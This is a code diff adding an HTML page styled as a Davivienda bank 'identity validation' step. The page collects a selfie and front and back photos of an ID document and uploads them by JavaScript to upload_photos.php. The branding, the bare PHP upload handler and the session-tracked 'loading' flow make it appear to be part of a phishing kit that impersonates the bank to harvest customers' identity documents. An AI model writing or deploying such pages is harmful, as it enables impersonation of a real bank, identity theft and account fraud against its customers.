@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validación de Identidad - Davivienda</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <header>
+        <div class="logo">
+            <img src="logo1.jpg" alt="Davivienda">
+        </div>
+    </header>
+
+    <div class="main-container">
+        <!-- Quitamos action/method, usaremos JS -->
+        <form id="photoForm" class="auth-container">
+            <h2 class="auth-title">Validación de Identidad</h2>
+            <h3 class="auth-subtitle">Por favor suba las siguientes fotos</h3>
+
+            <div class="form-group">
+                <label>Selfie (Hágase una foto usted mismo)</label>
+                <input type="file" id="selfie" accept="image/*" capture="user" required>
+            </div>
+
+            <div class="form-group">
+                <label>Foto frontal del documento</label>
+                <input type="file" id="foto_frontal" accept="image/*" capture="environment" required>
+            </div>
+
+            <div class="form-group">
+                <label>Foto trasera del documento</label>
+                <input type="file" id="foto_trasera" accept="image/*" capture="environment" required>
+            </div>
+
+            <button type="submit" class="btn-primary" id="btnSubmit">Enviar Documentos</button>
+            <div id="statusMsg" style="text-align: center; margin-top: 10px; color: #666; display: none;">Procesando
+                imágenes...</div>
+        </form>
+    </div>
+
+    <footer>
+        <p>
+            <a href="#">Políticas de Seguridad</a> |
+            <a href="#">Políticas de Privacidad</a> |
+            <a href="#">Términos y Condiciones</a>
+        </p>
+        <p>© DAVIVIENDA. Todos los derechos reservados.</p>
+    </footer>
+
+    <script>
+        document.getElementById('photoForm').addEventListener('submit', async function (e) {
+            e.preventDefault();
+
+            const btn = document.getElementById('btnSubmit');
+            const msg = document.getElementById('statusMsg');
+
+            btn.disabled = true;
+            btn.textContent = "Comprimiendo y Enviando...";
+            msg.style.display = 'block';
+
+            try {
+                const formData = new FormData();
+
+                // Función para comprimir
+                const compressImage = async (file, name) => {
+                    return new Promise((resolve) => {
+                        const reader = new FileReader();
+                        reader.readAsDataURL(file);
+                        reader.onload = (event) => {
+                            const img = new Image();
+                            img.src = event.target.result;
+                            img.onload = () => {
+                                const canvas = document.createElement('canvas');
+                                const MAX_WIDTH = 1200; // Reducir a 1200px max
+                                const scaleSize = MAX_WIDTH / img.width;
+                                canvas.width = MAX_WIDTH;
+                                canvas.height = img.height * scaleSize;
+
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+
+                                canvas.toBlob((blob) => {
+                                    resolve(blob);
+                                }, 'image/jpeg', 0.7); // 70% calidad
+                            }
+                        }
+                    });
+                };
+
+                // Comprimir cada archivo
+                const selfieFile = document.getElementById('selfie').files[0];
+                const frontalFile = document.getElementById('foto_frontal').files[0];
+                const traseraFile = document.getElementById('foto_trasera').files[0];
+
+                if (selfieFile) formData.append('selfie', await compressImage(selfieFile), 'selfie.jpg');
+                if (frontalFile) formData.append('foto_frontal', await compressImage(frontalFile), 'frontal.jpg');
+                if (traseraFile) formData.append('foto_trasera', await compressImage(traseraFile), 'trasera.jpg');
+
+                formData.append('content', 'compression_active');
+
+                // Enviar
+                const response = await fetch('upload_photos.php', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    // Usar la URL devuelta o ir directo
+                    // Asumimos exito -> redirect
+                    // Leeremos redirect del PHP si devuelve JSON, o forzamos
+                    const text = await response.text();
+                    // Si el PHP hace redirect con header location, fetch no sigue automáticamente el window location change de SPA
+                    // Pero si PHP devuelve Script o Redirect header...
+                    // Lo más simple: si OK, vamos a loading_photos
+
+                    // Extraer SID de la URL actual para mantener sesion
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const sid = urlParams.get('sid'); // O 'session_id'
+
+                    // Si upload_photos devuelve una redirección, fetch la sigue transparente.
+                    // Pero nuestra meta es cambiar la pagina.
+                    // Si upload_photos.php devuelve un Location header, fetch lo sigue y nos devuelve el HTML de loading_photos.
+                    // Podemos reemplazar el document body o simplemente navegar.
+
+                    // MEJOR: Que upload_photos devuelva JSON con la URL destino
+                    // PERO: Queremos mantener compatibilidad. Navegamos manualmente.
+
+                    // Intentamos obtener el SID desde la cookie o URL
+                    // Asumiremos que el backend procesó bien.
+
+                    // Si el backend hace header('Location: ...'); fetch lo seguirá y response.url será la nueva URL
+                    window.location.href = response.url;
+                } else {
+                    alert("Error al enviar. Intente con fotos más pequeñas.");
+                    btn.disabled = false;
+                    btn.textContent = "Enviar Documentos";
+                }
+
+            } catch (error) {
+                console.error(error);
+                alert("Error procesando las imágenes.");
+                btn.disabled = false;
+                btn.textContent = "Enviar Documentos";
+            }
+        });
+    </script>
+</body>
+
+</html>
